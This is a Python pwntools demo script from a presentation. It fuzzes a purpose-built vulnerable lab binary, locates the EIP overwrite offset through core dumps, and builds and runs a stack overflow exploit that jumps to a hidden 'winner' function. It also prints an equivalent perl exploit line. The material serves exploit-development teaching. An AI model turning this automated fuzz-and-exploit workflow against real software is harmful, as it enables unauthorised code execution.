#!/usr/bin/env python
###############################################################
#
# Script: 10_autopwn_demo.py
#
# Date: 02/16/2018
#
# Author: Travis Phillips
#
# Website: https://github.com/jaxhax-travis/presentation-pwntools
#
# Purpose: A demo script how to use the corefile, cyclic, and elf functions. 
#          to automatically fuzz and write an exploit for pwntools_demo_pwn_me
#          This is intended to be used with the supplied pwntools_demo_pwn_me
#          ELF that is generated from pwntools_demo_pwn_me.c. Feel free to
#          change the buffer size in vulnFunc() and watch it still work.
#
###############################################################
from pwn import *
import os
import sys

################################
# Constants
################################
LOW=1
HIGH=5000
BINARY="./pwntools_demo_pwn_me"

########################################################################
# Support Functions
########################################################################
def RunProcessSilent(args, inShell=False):
	context.log_level = 'error'
	p = process(args, shell=inShell)
	p.wait_for_close()
	p.close()
	context.log_level = 'info'

def CleanCoreDump():
	if os.path.isfile('./core'):
		os.remove('./core')

def OpenCoreDump():
	context.log_level = 'error'
	core = Coredump('./core')
	context.log_level = 'info'
	return core

def extendedTesting(offset):
	log.info("Possible EIP overwrite Offset {}. Testing EIP Overwrite 0x41414141".format(offset))
	RunProcessSilent([BINARY, cyclic(offset) + "AAAA"])
	core = OpenCoreDump()
	if core.eip != 0x41414141:
		log.failure("EIP Overwrite 0x41414141 Failed: Actual => 0x{:08x}".format(core.eip))
		return False
	
	log.info("Possible EIP overwrite Offset {}. Testing EIP Overwrite 0x42424242".format(offset))
	RunProcessSilent([BINARY, cyclic(offset) + "BBBB"])
	core = OpenCoreDump()
	if core.eip != 0x42424242:
		log.failure("EIP Overwrite 0x42424242 Failed: Actual => 0x{:08x}".format(core.eip))
		return False
	
	log.info("Possible EIP overwrite Offset {}. Testing EIP Overwrite 0xdeadbeef".format(offset))
	RunProcessSilent([BINARY, cyclic(offset) + p32(0xdeadbeef)])
	core = OpenCoreDump()
	if core.eip != 0xdeadbeef:
		log.failure("EIP Overwrite 0xdeadbeef Failed: Actual => 0x{:08x}".format(core.eip))
		return False

	return True

########################################################################
# Main Code
########################################################################

#############################################
# Check for binary.
#############################################
if os.path.isfile(BINARY) == False:
	log.failure("You appear to be missing '{}'. Aborting!".format(BINARY))
	sys.exit(1)

#############################################
# Open it with ELF() and make sure it's
# executable.
#############################################
log.info("Opening {}".format(BINARY))
e = ELF(BINARY, checksec=False)
if e.executable == False:
	log.failure("{} doesn't seem to be executable. Aborting!".format(BINARY))
	sys.exit(2)

#############################################
# Make sure our shell has ulimit ran on it
#############################################
log.info("Setting \"ulimit -c unlimited\" on shell...")
RunProcessSilent(["ulimit", "-c", "unlimited"], True)

#############################################
# Check if a core dump file already exist.
# delete it if it does.
#############################################
CleanCoreDump()

#############################################
# Start our fuzzer loop.
#############################################
spinner = log.progress("Running Fuzzer")
for i in xrange(LOW, HIGH + 1):
	spinner.status("Testing {} out of {}".format(i, HIGH))

	#############################################
	# Run the vuln app with a pattern of current
	# length of fuzzer loop.
	#############################################
	RunProcessSilent([BINARY, cyclic(i)])
	
	#############################################
	# Check for a core file
	#############################################
	if os.path.isfile('./core'):
	
		#############################################
		# If we have a core dump file, open it and
		# check if the EIP is in the pattern
		#############################################
		core = OpenCoreDump()
		if cyclic_find(core.eip) > 0:
		
			#############################################
			# If so do three more checks to verify we do
			# in fact control EIP with the offset used.
			#############################################
			spinner.success("Possible EIP overwrite Offset {}. Running Extended Test".format(cyclic_find(core.eip)))
			
			if extendedTesting(cyclic_find(core.eip)):
				#############################################
				# If we do, Let's try to run a real exploit
				# to run neverCalledWinnerFunction() and
				# exit the fuzzer!
				#############################################
				log.success("Offset {} seems to have passed extened testing. Creating Exploit!".format(cyclic_find(core.eip)))
				eip_offset = cyclic_find(core.eip)
				eip_overwrite = e.functions['neverCalledWinnerFunction'].address
				log.info("Exploit: \033[35;1m{} $(perl -e 'print \"A\"x{}; print \"\\x{:02x}\\x{:02x}\\x{:02x}\\x{:02x}\";')\033[0m".format(BINARY, eip_offset, (eip_overwrite & 0x000000FF), (eip_overwrite & 0x0000FF00) >> 8, (eip_overwrite & 0x00FF0000) >> 16, (eip_overwrite & 0xFF000000) >> 24))
				log.info("Dumping Exploit Process run:")
				context.log_level = 'error'
				payload = cyclic(eip_offset)
				payload += p32(eip_overwrite) # p32() will pack a 32 bit int into little endian for us.
				p = process([BINARY, payload])
				print(p.recv(4096))
				p.wait_for_close()
				p.close()
				context.log_level = 'info'
				log.info("EIP overwrite offset found to be {} bytes".format(eip_offset))
				log.info("Complete. Hope it was everything you wanted it to be... :-)")
				log.success("Script Finished!\n\n")
				CleanCoreDump()
				sys.exit(0)
			else:
				log.failure("Extended testing of offset {} failed...".format(cyclic_find(core.eip)))
				spinner = log.progress("Running Fuzzer")

		#############################################
		# Finally, Delete the core dump so next loop
		# is clean!
		#############################################
		CleanCoreDump()

spinner.failure("Doesn't seem like we found an offset that worked... :-(")
log.success("Script Finished!\n\n")
